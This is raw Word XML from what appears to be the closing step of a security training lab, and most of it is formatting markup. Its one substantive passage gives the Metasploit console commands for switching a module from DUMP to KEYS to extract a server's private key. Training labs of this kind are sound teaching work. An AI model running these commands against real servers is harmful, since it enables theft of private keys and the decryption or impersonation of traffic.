      <w:r w:rsidRPr="0023150F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62756060" wp14:editId="4BFF3BBC">
            <wp:extent cx="5769418" cy="571500"/>
            <wp:effectExtent l="0" t="0" r="3175" b="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39">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="15925" t="85299" r="54128" b="8705"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5883422" cy="582793"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D9E0DFD" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="008926CE" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:r w:rsidRPr="008926CE">
        <w:t xml:space="preserve">To extract the server’s Private </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008926CE">
        <w:t>Key</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008926CE">
        <w:t xml:space="preserve"> you can use the KEYS action instead of DUMP in the opened Metasploit Console as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438B807F" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="008926CE" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="008926CE">
        <w:t xml:space="preserve">show </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008926CE">
        <w:t>actions</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="59CD5CF4" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="008926CE" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="008926CE">
        <w:t xml:space="preserve">set action </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008926CE">
        <w:t>KEYS</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3673EE28" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="008926CE" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="008926CE">
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1884557E" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="701E78D1" w14:textId="444DAEDA" w:rsidR="00F41163" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CD0EA2">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">End of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Lab</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00F41163" w:rsidSect="00881813">
      <w:footerReference w:type="default" r:id="rId40"/>
      <w:pgSz w:w="11907" w:h="16839" w:code="9"/>
      <w:pgMar w:top="1418" w:right="1134" w:bottom="1134" w:left="1134" w:header="284" w:footer="39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6E7C112" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E69766" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="604ADEF2" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="3357E147" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="4D6A21D5" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="7BA0B554" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7EE93DA5" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EEE3D1" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="6BA6B2F2" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="752BEEF0" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="317A6526" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="3F87354D" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF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egoe UI">
    <w:panose1 w:val="020B0502040204020203"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E4002EFF" w:usb1="C000E47F"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Light">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Lucida Console">
    <w:panose1 w:val="020B0609040504020204"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="8000028F" w:usb1="00001800" w:usb2="00000000" w:usb3="00000000" w:csb0="0000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81205619"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtContent>
      <w:p w14:paraId="06C99345" w14:textId="77777777" w:rsidR="00A87514" w:rsidRDefault="00A87514" w:rsidP="00881813">
        <w:pPr>
          <w:pStyle w:val="QAFooter"/>
        </w:pPr>
        <w:r>
          <w:rPr>
            <w:noProof w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof w:val="0"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="0023150F">
          <w:t>1</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F06FD1F" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A294AE0" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="4D2A718E" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="705329ED" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="417C6507" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="5C3CA804" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7A58968B" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="33944D88" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="5B6F179F" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="4FEA17F6" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="62A6131B" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>
    <w:p w14:paraId="1837CB60" w14:textId="77777777" w:rsidR="00D47C05" w:rsidRDefault="00D47C05" w:rsidP="00350DF2"/>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DF90594"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7D7A560A"/>
    <w:styleLink w:val="QAStylelist"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="227" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:hint="default"/>
        <w:sz w:val="20"/>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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2DD205C1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D866617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49D418F6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E98418C0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="QATableBullets"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="284" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:color w:val="333F48"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="510" w:hanging="226"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="737" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1985" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2552" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3119" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3686" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4253" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4820" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="513F3354"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9A682326"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="QABullets"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="340" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:b/>
        <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="924" w:hanging="204"/>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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="590E49FA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="66203320"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="QANumbers"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="568" w:hanging="284"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1004" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1364" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="(%4)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1724" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="(%5)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2084" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="(%6)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2444" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2804" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3164" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3524" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="668C51FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D856F844"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="QATableNumbers"/>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814614385">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="969673983">
    <w:abstractNumId w:val="3"/>
    <w:lvlOverride w:ilvl="0">
      <w:lvl w:ilvl="0">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:pStyle w:val="QABullets"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="340" w:hanging="227"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
          <w:b/>
          <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="1">
      <w:lvl w:ilvl="1">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val="o"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="567" w:hanging="227"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:lvl w:ilvl="2">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="794" w:hanging="227"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="3">
      <w:lvl w:ilvl="3">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="2880" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="4">
      <w:lvl w:ilvl="4">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val="o"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="3600" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="5">
      <w:lvl w:ilvl="5">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="4320" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="6">
      <w:lvl w:ilvl="6">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="5040" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="7">
      <w:lvl w:ilvl="7">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val="o"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="5760" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="8">
      <w:lvl w:ilvl="8">
        <w:start w:val="1"/>
        <w:numFmt w:val="bullet"/>
        <w:lvlText w:val=""/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="6480" w:hanging="360"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="357510721">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="136803597">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="522520045">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="899830198">
    <w:abstractNumId w:val="4"/>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3"/>
  <w:proofState w:spelling="clean" w:grammar="clean"/>
  <w:attachedTemplate r:id="rId1"/>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stylePaneSortMethod w:val="0000"/>
  <w:documentProtection w:formatting="1" w:enforcement="1" w:cryptProviderType="rsaAES" w:cryptAlgorithmClass="hash" w:cryptAlgorithmType="typeAny" w:cryptAlgorithmSid="14" w:cryptSpinCount="100000" w:hash="JGovDofUXOgDmE8LgXrB7NUffYQp4oJW4zXYOwQBFBcN2mNIBUBYYdbgxsUAWpuCly31BUKlIxmy3BroJf44+Q==" w:salt="z2/oATpCWunrcH2llLJMFg=="/>
  <w:styleLockTheme/>
  <w:styleLockQFSet/>
  <w:defaultTabStop w:val="567"/>
  <w:drawingGridHorizontalSpacing w:val="12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14038"/>
    <w:rsid w:val="00002A60"/>
    <w:rsid w:val="0000472B"/>
    <w:rsid w:val="00005F8A"/>
    <w:rsid w:val="00006931"/>
    <w:rsid w:val="000069D2"/>
    <w:rsid w:val="000077A9"/>
    <w:rsid w:val="0001034F"/>
    <w:rsid w:val="0001059F"/>
    <w:rsid w:val="000107AA"/>
    <w:rsid w:val="0001245E"/>
    <w:rsid w:val="000127F1"/>
    <w:rsid w:val="00012FA3"/>
    <w:rsid w:val="0001335A"/>
    <w:rsid w:val="00014038"/>
    <w:rsid w:val="00014143"/>
    <w:rsid w:val="0001441B"/>
    <w:rsid w:val="000151C9"/>
    <w:rsid w:val="00016477"/>
    <w:rsid w:val="00016D6F"/>
    <w:rsid w:val="00017069"/>
    <w:rsid w:val="0002052B"/>
    <w:rsid w:val="00020F3B"/>
    <w:rsid w:val="00020FED"/>
    <w:rsid w:val="00021237"/>
    <w:rsid w:val="00022F74"/>
    <w:rsid w:val="000252B2"/>
    <w:rsid w:val="00026713"/>
    <w:rsid w:val="0002799B"/>
    <w:rsid w:val="00030D22"/>
    <w:rsid w:val="00032508"/>
    <w:rsid w:val="000355BE"/>
    <w:rsid w:val="00035F27"/>
    <w:rsid w:val="00040277"/>
    <w:rsid w:val="0004032F"/>
    <w:rsid w:val="0004067A"/>
    <w:rsid w:val="000406BE"/>
    <w:rsid w:val="00040747"/>
    <w:rsid w:val="00040F8D"/>
    <w:rsid w:val="000410EC"/>
    <w:rsid w:val="00042988"/>
    <w:rsid w:val="00042EB0"/>
    <w:rsid w:val="000432D0"/>
    <w:rsid w:val="00043948"/>
    <w:rsid w:val="0004529D"/>
    <w:rsid w:val="00046B3D"/>
    <w:rsid w:val="00047159"/>
    <w:rsid w:val="000479DB"/>
    <w:rsid w:val="000505BB"/>
    <w:rsid w:val="00051F16"/>
    <w:rsid w:val="00053A1C"/>
    <w:rsid w:val="000552B4"/>
    <w:rsid w:val="00056239"/>
    <w:rsid w:val="000572D5"/>
    <w:rsid w:val="0005777B"/>
    <w:rsid w:val="000579DE"/>
    <w:rsid w:val="00061785"/>
    <w:rsid w:val="00062CFD"/>
    <w:rsid w:val="00062EC5"/>
    <w:rsid w:val="00062F2F"/>
    <w:rsid w:val="00065CE3"/>
    <w:rsid w:val="00067D7F"/>
    <w:rsid w:val="0007367F"/>
    <w:rsid w:val="00073BEC"/>
    <w:rsid w:val="00074242"/>
    <w:rsid w:val="000742C7"/>
    <w:rsid w:val="000756F5"/>
    <w:rsid w:val="00076FB2"/>
    <w:rsid w:val="00080424"/>
    <w:rsid w:val="00080E35"/>
    <w:rsid w:val="0008105C"/>
    <w:rsid w:val="0008172E"/>
    <w:rsid w:val="00081A53"/>
    <w:rsid w:val="0008253F"/>
    <w:rsid w:val="00087AAC"/>
    <w:rsid w:val="00091614"/>
    <w:rsid w:val="00091631"/>
    <w:rsid w:val="00091653"/>
    <w:rsid w:val="00091CDB"/>
    <w:rsid w:val="000924AC"/>
    <w:rsid w:val="00092C6A"/>
    <w:rsid w:val="000930F8"/>
    <w:rsid w:val="000948FA"/>
    <w:rsid w:val="00095BBB"/>
    <w:rsid w:val="00095EBB"/>
    <w:rsid w:val="0009683A"/>
    <w:rsid w:val="00097A22"/>
    <w:rsid w:val="00097A60"/>
    <w:rsid w:val="000A16DF"/>
    <w:rsid w:val="000A27E3"/>
    <w:rsid w:val="000A2A81"/>
    <w:rsid w:val="000A2E64"/>
    <w:rsid w:val="000A466F"/>
    <w:rsid w:val="000A4EA6"/>
    <w:rsid w:val="000A568D"/>
    <w:rsid w:val="000A5A0F"/>
    <w:rsid w:val="000A6DE2"/>
    <w:rsid w:val="000A7275"/>
    <w:rsid w:val="000A7AD7"/>
    <w:rsid w:val="000B00E7"/>
    <w:rsid w:val="000B3030"/>
    <w:rsid w:val="000B5D4D"/>
    <w:rsid w:val="000B64E4"/>
    <w:rsid w:val="000B6B2B"/>
    <w:rsid w:val="000C05B8"/>
    <w:rsid w:val="000C07F0"/>
    <w:rsid w:val="000C32E0"/>
    <w:rsid w:val="000C404C"/>
    <w:rsid w:val="000C4252"/>
    <w:rsid w:val="000C4ED7"/>
    <w:rsid w:val="000C4ED9"/>
    <w:rsid w:val="000C5891"/>
    <w:rsid w:val="000C5A51"/>
    <w:rsid w:val="000C68F5"/>
    <w:rsid w:val="000C6C29"/>
    <w:rsid w:val="000C7AFC"/>
    <w:rsid w:val="000C7D77"/>
    <w:rsid w:val="000C7DAF"/>
    <w:rsid w:val="000D3284"/>
    <w:rsid w:val="000D3A92"/>
    <w:rsid w:val="000D42E7"/>
    <w:rsid w:val="000D4BFB"/>
    <w:rsid w:val="000D5254"/>
    <w:rsid w:val="000D75C9"/>
    <w:rsid w:val="000E023F"/>
    <w:rsid w:val="000E0C90"/>
    <w:rsid w:val="000E1E12"/>
    <w:rsid w:val="000E2AA7"/>
    <w:rsid w:val="000E3A1F"/>
    <w:rsid w:val="000E402F"/>
    <w:rsid w:val="000E5CEC"/>
    <w:rsid w:val="000E6470"/>
    <w:rsid w:val="000F0101"/>
    <w:rsid w:val="000F0190"/>
    <w:rsid w:val="000F0BD9"/>
    <w:rsid w:val="000F0CB6"/>
    <w:rsid w:val="000F1A62"/>
    <w:rsid w:val="000F1BE9"/>
    <w:rsid w:val="000F1F02"/>
    <w:rsid w:val="000F3E8A"/>
    <w:rsid w:val="000F3F98"/>
    <w:rsid w:val="000F4682"/>
